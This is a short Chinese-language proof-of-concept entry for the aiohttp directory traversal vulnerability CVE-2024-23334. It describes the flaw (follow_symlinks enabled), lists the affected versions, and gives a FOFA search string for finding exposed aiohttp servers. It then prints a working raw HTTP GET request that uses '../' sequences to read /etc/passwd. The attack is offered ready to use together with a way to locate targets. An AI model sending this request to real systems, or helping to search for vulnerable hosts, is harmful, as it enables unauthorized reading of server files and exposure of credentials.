## aiohttp存在目录遍历漏洞(CVE-2024-23334)
aiohttp是一个Python的HTTP客户端/服务器框架，它基于asyncio库实现异步编程模型，可以支持高性能和高并发的HTTP通信。aiohttp用于编写异步的Web服务器、Web应用程序或HTTP客户端，以提供对Web和HTTP资源的访问和操作。近日监测到aiohttp目录遍历漏洞的漏洞情报,aiohttp使用选项"follow_symlinks"来决定是否跟踪静态根目录之外的符号链接。当"follow_symlinks "设置为 "True "时,将不会验证读取的文件是否在根目录内从而导致目录遍历，攻击者可以利用此漏洞访问系统上的任意文件。

## 版本
```
1.0.5 <aiohttp < 3.9.2
```

## fofa
```
app="aiohttp"
```

## poc
```
GET /static/../../../../../../etc/passwd HTTP/1.1
Host: xxxxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
![image](https://github.com/wy876/POC/assets/139549762/0488dc1b-6aaa-4a3e-91f3-1f64a6e69e89)
